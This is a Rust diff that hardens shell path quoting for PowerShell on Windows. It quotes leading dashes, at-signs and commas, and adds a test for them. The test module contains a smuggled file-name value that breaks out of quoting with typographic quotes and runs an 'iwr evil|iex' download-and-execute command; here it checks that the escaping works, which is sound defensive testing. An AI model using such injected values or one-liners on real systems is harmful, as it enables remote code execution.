@@ -1041,7 +1041,9 @@ pub(crate) fn shown_title(title: &str) -> &str {
 /// when plain, else single-quoted (`'` escaped as the shell wants it).
 fn quote_paths(paths: impl IntoIterator<Item = String>) -> String {
     let quote = |p: String| {
-        if !p.is_empty() && p.chars().all(|c| c.is_ascii_alphanumeric() || "/._-+=,:@%~".contains(c)) {
+        // PowerShell reads a leading `-` as a parameter, `@` as a splat and `,` as an array.
+        let powershell_syntax = cfg!(windows) && (p.starts_with(['-', '@']) || p.contains(','));
+        if !p.is_empty() && !powershell_syntax && p.chars().all(|c| c.is_ascii_alphanumeric() || "/._-+=,:@%~".contains(c)) {
             return p;
         }
         if cfg!(windows) { crate::programs::powershell_quote(&p) } else { format!("'{}'", p.replace('\'', "'\\''")) }
@@ -3178,6 +3180,7 @@ mod tests {
         let q = |v: &[&str]| super::quote_paths(v.iter().map(|s| s.to_string()));
         assert_eq!(q(&["C:/a b.png"]), "'C:/a b.png' ");
         assert_eq!(q(&["it's.png"]), "'it''s.png' ");
+        assert_eq!(q(&["-Force", "@list.txt", "a,b.txt", "C:/plain/x-y.png"]), "'-Force' '@list.txt' 'a,b.txt' C:/plain/x-y.png ");
         assert_eq!(q(&["r\u{2019};iwr evil|iex;\u{2019}.png"]), "'r\u{2019}\u{2019};iwr evil|iex;\u{2019}\u{2019}.png' ");
         for c in ['\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}'] {
             assert_eq!(q(&[&format!("a{c}b")]), format!("'a{c}{c}b' "));
